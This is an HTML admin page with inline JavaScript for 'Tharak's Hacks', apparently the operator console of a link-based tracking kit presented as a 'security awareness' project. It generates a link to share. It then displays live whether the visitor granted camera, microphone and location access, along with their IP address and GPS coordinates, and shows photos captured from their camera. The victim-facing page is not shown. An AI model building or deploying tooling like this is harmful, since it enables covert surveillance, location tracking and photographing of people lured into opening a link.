<!doctype html><meta name="viewport" content="width=device-width,initial-scale=1"><title>Tharak's Hacks</title><link rel="stylesheet" href="/style.css"><main><h1>Tharak's Hacks</h1><p>Security Awareness Project — Admin</p><button id="generateBtn">Generate New Link</button><div id="link"></div><section><h2>Live Session</h2><div id="info">No active session.</div><div id="photos"></div></section></main><script src="/socket.io/socket.io.js"></script><script>
const so=io(),link=document.querySelector("#link"),info=document.querySelector("#info"),photos=document.querySelector("#photos"),generateBtn=document.querySelector("#generateBtn");let sid;
generateBtn.addEventListener("click",async()=>{generateBtn.disabled=true;generateBtn.textContent="Creating...";try{let r=await fetch("/api/session",{method:"POST"});if(!r.ok)throw new Error("HTTP "+r.status);let d=await r.json();sid=d.id;let u=location.origin+d.url;link.innerHTML="<b>Share:</b><input value='"+u+"' readonly><button id=\"copyBtn\">Copy</button>";document.querySelector("#copyBtn").onclick=async()=>{await navigator.clipboard.writeText(u);document.querySelector("#copyBtn").textContent="Copied!"};so.emit("admin:join",{sessionId:sid})}catch(e){link.textContent="Could not create session. Check that npm start is running.";console.error(e)}finally{generateBtn.disabled=false;generateBtn.textContent="Generate New Link"}});
so.on("session:update",s=>{if(s.id!==sid)return;info.innerHTML=`<div class="grid"><b>Camera: ${s.permissions.camera?"Granted":"Pending"}</b><b>Mic: ${s.permissions.microphone?"Granted":"Pending"}</b><b>Location: ${s.permissions.location?"Granted":"Pending"}</b><b>IP: ${s.ip||"Pending"}</b><b>Coordinates: ${s.location?s.location.latitude.toFixed(5)+", "+s.location.longitude.toFixed(5):"Pending"}</b><b>Photo consent: ${s.automaticCaptureConsent?"Granted":"Pending"}</b></div>`});
so.on("photo:captured",p=>{photos.insertAdjacentHTML("afterbegin",`<img src="/photo/${encodeURIComponent(p.fileName)}">`)});
</script>
